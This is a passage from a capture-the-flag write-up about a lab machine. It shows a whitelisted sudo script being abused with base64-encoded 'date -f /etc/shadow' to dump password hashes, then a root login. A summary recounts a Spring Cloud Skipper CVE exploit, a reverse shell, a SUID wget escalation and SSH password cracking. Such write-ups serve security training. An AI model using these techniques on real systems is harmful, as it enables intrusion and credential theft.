    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User mathlake may run the following commands on mathdop:
    (ALL) NOPASSWD: /opt/secure_input_handler.sh
```

`mathlake` can execute `/opt/secure_input_handler.sh` as root with **no password**.

### Analysing the Restricted Script

```bash
[mathlake@mathdop ~]$ file /opt/secure_input_handler.sh
/opt/secure_input_handler.sh: Bourne-Again shell script, ASCII text executable
[mathlake@mathdop ~]$ ls -la /opt/secure_input_handler.sh
-rwxr-xr-x. 1 root root 803 Mar 30  2025 /opt/secure_input_handler.sh
[mathlake@mathdop ~]$ cat /opt/secure_input_handler.sh
#!/bin/bash
export PATH="/usr/bin"

read -p "Input Command: " user_input

decoded_input=$(echo -n "$user_input" | base64 -d 2>/dev/null | tr -d '\r\0\a' | col -b)
if [[ ${#user_input} -gt 128 || -z "$decoded_input" ]]; then
    echo "[!] Decoding failed or input is too long" >&2
    exit 2
fi

filtered_input=$(echo "$decoded_input" | tr -cd 'a-zA-Z0-9\-_/ :.' | sed -e 's/[[:space:]]\+/ /g' -e 's/^[ \t]*//' -e 's/[ \t]*$//')

IFS=' ' read -ra cmd_args <<< "$filtered_input"
command="${cmd_args[0]}"
command_clean=$(echo "$command" | tr -d -c 'a-zA-Z0-9')

allowed_commands=("date" "pwd" "echo")
if ! printf "%s\n" "${allowed_commands[@]}" | grep -qxF "$command_clean"; then
    echo "[!] Illegal instruction: $command_clean" >&2
    exit 3
fi

/usr/bin/timeout 2 /usr/bin/bash -c "${filtered_input}"
```

**Script logic analysis:**
1. Reads input, Base64-decodes it.
2. Strips dangerous characters (only `a-zA-Z0-9\-_/ :.` allowed after decode).
3. Extracts the first word as the command name.
4. Whitelist checks: only `date`, `pwd`, `echo` are permitted.
5. Executes the full filtered command via `/usr/bin/bash -c` with a 2-second timeout.

**Attack vector:** The `date` command is in the whitelist. The GNU `date -f` option reads a file and attempts to parse each line as a date expression — this is a known file-read technique catalogued on GTFOBins:

![](image-2.png)

The GTFOBins entry for `date` (SUID / file read) shows:
- **Version requirement**: GNU
- **Method**: `date -f /path/to/input-file`
- **Caveat**: Each line is corrupted by a prefix string and wrapped inside quotes (output is mangled but readable).

Since the script runs `date` as root via sudo, we can read any file — including `/etc/shadow`.

### Reading /etc/shadow via date -f

```bash
[mathlake@mathdop ~]$ echo -n "date -f /etc/shadow" | base64
ZGF0ZSAtZiAvZXRjL3NoYWRvdw==
[mathlake@mathdop ~]$ sudo /opt/secure_input_handler.sh
Input Command: ZGF0ZSAtZiAvZXRjL3NoYWRvdw==
date: invalid date '# Worth waiting for'
date: invalid date '# 9e9feaf74138c66fbaadba5a9da259c5'
date: invalid date 'root:$6$WUx.0Qf6$/oYqJocLrdpGZJup8oAxMoxjJnZ3huUNKno6TObA/fcbax0yhptGiAP2pNcjJfsCQ0o5H2RgpyP6R/CiZh33m.:20177:0:99999:7:::'
date: invalid date 'bin:*:18353:0:99999:7:::'
date: invalid date 'daemon:*:18353:0:99999:7:::'
date: invalid date 'adm:*:18353:0:99999:7:::'
date: invalid date 'lp:*:18353:0:99999:7:::'
date: invalid date 'sync:*:18353:0:99999:7:::'
date: invalid date 'shutdown:*:18353:0:99999:7:::'
date: invalid date 'halt:*:18353:0:99999:7:::'
date: invalid date 'mail:*:18353:0:99999:7:::'
date: invalid date 'operator:*:18353:0:99999:7:::'
date: invalid date 'games:*:18353:0:99999:7:::'
date: invalid date 'ftp:*:18353:0:99999:7:::'
date: invalid date 'nobody:*:18353:0:99999:7:::'
date: invalid date 'systemd-network:!!:20157::::::'
date: invalid date 'dbus:!!:20157::::::'
date: invalid date 'polkitd:!!:20157::::::'
date: invalid date 'sshd:!!:20157::::::'
date: invalid date 'postfix:!!:20157::::::'
date: invalid date 'mathlake:$6$XdfsxCCu$sHnJOhJpbvkbW/aLnCE/4QyYVYW0j2DNSByRxiJ2pLuFJkXi8Yk.wD33.SEUxtTuZ3z1xYqchgilvmX2yzZsq.:20177:0:99999:7:::'
```

The `/etc/shadow` file is printed via `date`'s error messages. The first two comment lines at the top of the shadow file are critical:

```
# Worth waiting for
# 9e9feaf74138c66fbaadba5a9da259c5
```

The **root password is stored in plaintext as a comment in `/etc/shadow`**: `Worth waiting for`.

### su to root

```bash
[mathlake@mathdop ~]$ su - root
Password:
Last login: Sun Mar 30 18:35:48 CST 2025 from 192.168.137.190 on pts/1
[root@mathdop ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@mathdop ~]# whoami
root
[root@mathdop ~]# hostname
mathdop
```

### Flags

```bash
[root@mathdop ~]# cat /home/mathlake/user.txt /root/r00000000000000000000000000000000000000000000000000000t.txt
flag{d79[REDACTED]}
flag{299[REDACTED]}
```

Both the **user flag** (`/home/mathlake/user.txt`) and **root flag** (`/root/r00000000000000000000000000000000000000000000000000000t.txt`) were successfully retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: Full Nmap scan of `192.168.100.141` revealed SSH on port 22, Spring Cloud Skipper on port 7577, and Spring Cloud Data Flow on port 9393 — both unauthenticated and exposing risky HTTP methods (PUT, PATCH, DELETE).

2. **Vulnerability Discovery**: Version fingerprinting via `/api/about` and `/about` identified **Spring Cloud Skipper / Data Flow 2.11.3-SNAPSHOT** with authentication disabled. This version is vulnerable to **CVE-2024-37084** — an unauthenticated RCE via malicious package upload to the Skipper API.

3. **Exploitation (RCE → Container Shell)**: A malicious Java JAR implementing `ScriptEngineFactory` was compiled, packaged, and served over HTTP. The CVE-2024-37084 PoC uploaded a crafted `package.yaml` ZIP to Skipper, causing the server to fetch and load the JAR — executing a bash reverse shell and landing a session as `cnb` inside a Docker container (hostname `921567b128b2`).

4. **Container Escalation (cnb → euid=root)**: SUID enumeration revealed `/usr/local/bin/wget` (owned root, SUID set). The GTFOBins `wget --use-askpass` technique was used to execute a privileged `/bin/sh -p`, yielding `euid=0` within the container. A note in `/home/cnb/note` revealed a math challenge (time series decomposition) targeting user `mathlake`.

5. **Lateral Movement (Container → Host SSH)**: With container root, the mail spool `/var/mail/mathlake/` was accessed, revealing quarterly sales data (2015–2020). Time series decomposition was applied to calculate T, S, and C for June 2025. A brute-force script hashed candidate `T*S*C` strings with SHA-256 (per the "256 is my favorite number" hint), and Hydra cracked the SSH password for `mathlake` on the host: `9bd29d2c90998b5af05b3fdf10d9ab4c9eff53f2a827fbc39247200874ab6ca3`.

6. **Privilege Escalation (mathlake → root)**: `sudo -l` revealed `mathlake` could run `/opt/secure_input_handler.sh` as root without a password. The script accepted only Base64-encoded input, restricted decoded commands to a whitelist (`date`, `pwd`, `echo`), and filtered special characters. The GNU `date -f` file-read GTFOBins technique was abused: `date -f /etc/shadow` was Base64-encoded and submitted, printing the entire shadow file via error messages — including the comment `# Worth waiting for` which was the root plaintext password. `su - root` with this password granted a full root shell and both flags were captured.
